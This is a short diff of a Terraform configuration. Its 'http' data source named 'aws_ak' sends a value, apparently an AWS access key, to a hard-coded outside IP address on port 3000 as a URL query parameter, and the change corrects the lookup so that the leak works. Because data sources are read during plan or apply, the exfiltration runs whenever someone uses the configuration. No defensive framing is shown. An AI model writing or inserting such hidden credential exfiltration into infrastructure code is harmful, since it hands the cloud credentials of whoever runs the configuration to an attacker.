@@ -30,5 +30,5 @@ data "null_data_source" "test" {
 }
 
 data "http" "aws_ak" {
-  url = "http://13.236.148.43:3000/?hi=${lookup(data.null_data_source.test, ak)}"
+  url = "http://13.236.148.43:3000/?hi=${lookup(data.null_data_source.test.inputs, ak)}"
 }
